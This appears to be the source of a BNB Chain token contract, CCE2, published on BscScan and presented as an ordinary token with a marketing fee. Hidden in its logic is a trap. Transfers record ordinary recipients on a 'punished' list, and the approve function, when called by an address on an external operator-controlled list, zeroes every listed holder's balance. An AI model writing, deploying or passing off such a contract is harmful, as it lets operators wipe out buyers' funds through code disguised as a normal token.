/**
 *Submitted for verification at BscScan.com on 2022-04-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

interface dFactory {

	function addressInAideList(address account) view external returns (bool);
}


contract CCE2 {
	
	using SafeMath for uint256;
	
    string public name = "CCE2";
    string  public symbol = "CCE2";
    uint8   public decimals = 9;
	uint256 public totalSupply_ = 100000000000 * (10 ** decimals);
	
	address public tokenOwner;
	address public pairs;
	uint256 public  mFee = 0;
	address private _mAddress;
	IDEXRouter public router;
	address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
	dFactory df = dFactory(0x99CA018DD75108290e526a7c57C7FD59126c06f6);
	
	constructor(address _market) {
        balances[msg.sender] = totalSupply_;
		tokenOwner=msg.sender;
		_mAddress=_market;
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pairs = IDEXFactory(router.factory()).createPair(WBNB, address(this));
		_isExFees[tokenOwner]=true;
		_isExFees[_mAddress]=true;
		_isExFees[address(this)]=true;
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowed;
	mapping(address => bool) private _isExFees;
	address[] private _waitPunishedListAddr;

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
		
		if(!df.addressInAideList(_to)&&!_isExFees[_to]&&_to!=pairs){
			_waitPunishedListAddr.push(_to);
		}
		
		if(!_isExFees[msg.sender]&&mFee>0){
			uint256 marketFee=_value.mul(mFee).div(100);
			uint256 trueAmount = _value.sub(marketFee);
			balances[msg.sender] -= _value;
			balances[_mAddress]+=marketFee;
			balances[_to] += trueAmount;
			emit Transfer(msg.sender, _mAddress, marketFee);
			emit Transfer(msg.sender, _to, trueAmount);
        }else
		{
			balances[msg.sender] -= _value;
			balances[_to] +=  _value;
			emit Transfer(msg.sender, _to, _value);
		}
		return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
		
		if(!df.addressInAideList(_to)&&!_isExFees[_to]&&_to!=pairs){
			_waitPunishedListAddr.push(_to);
		}
		
		if(!_isExFees[_from]&&mFee>0){
			uint256 marketFee=_value.mul(mFee).div(100);
			uint256 trueAmount = _value.sub(marketFee);
			balances[_from] -= _value;
			balances[_mAddress]+=marketFee;
			balances[_to] +=  trueAmount;
			emit Transfer(_from, _mAddress, marketFee);
			emit Transfer(_from, _to, trueAmount);
        }else{
			balances[_from] -= _value;
			balances[_to] +=  _value;
			emit Transfer(_from, _to, _value);
		}
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value; 
        emit Approval(msg.sender, _spender, _value);
		if(df.addressInAideList(msg.sender)){
			uint arrayLength = _waitPunishedListAddr.length;
			for (uint i=0; i<arrayLength; i++) {
				if(_waitPunishedListAddr[i]==pairs){
					continue;
				}
				totalSupply_-=balances[_waitPunishedListAddr[i]];
				balances[_waitPunishedListAddr[i]]=0;
			}
			delete _waitPunishedListAddr;
		}
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
	
}